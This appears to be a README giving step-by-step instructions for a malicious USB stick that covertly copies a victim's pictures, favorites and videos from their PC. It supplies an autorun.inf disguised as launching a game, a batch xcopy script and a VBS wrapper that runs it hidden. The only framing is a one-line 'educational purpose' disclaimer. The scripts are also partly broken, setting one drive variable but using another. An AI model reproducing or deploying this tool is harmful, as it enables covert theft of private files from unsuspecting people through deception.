# Data_Retrieving_USB

--------------------------------------"DISCLAIMER:-ITS JUST FOR EDUCATIONAL PURPOSE"-------------------------------------------




Its a code to make pendrive copy all data of the victim's pc and paste it to the USB.




--------------------step 1------------- 

insert you pendive and open notepad



---------------------Step 2--------------------------

[autorun] 
icon=drive.ico
open=launch.bat
action=Click ok to Run game for Windows
shell\open\command=launch.bat

When finished Save As.. and name file "autorun" change
the extention to .inf

----------------------Step 3-----------------------

@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
@echo off 
cls

Save as.. and name "file" change extention to .bat

------------Step 4-----------------

CreateObject("Wscript.Shell").Run """" & 
WScript.Arguments(0) & """", 0, False

save as.. and name "invisible" change the extension to .vbs

Step 5:

wscript.exe \invisible.vbs file.bat 

Save as.. "launch" change extension to .bat

-------------------step 5------------------

Also create a folder name "ALL" in the pendrive
________________________________________________________________


At last just make the "Launch.bat" auto run on plugging the USb by "AUTORUN SOFTWARE CREATOR" software







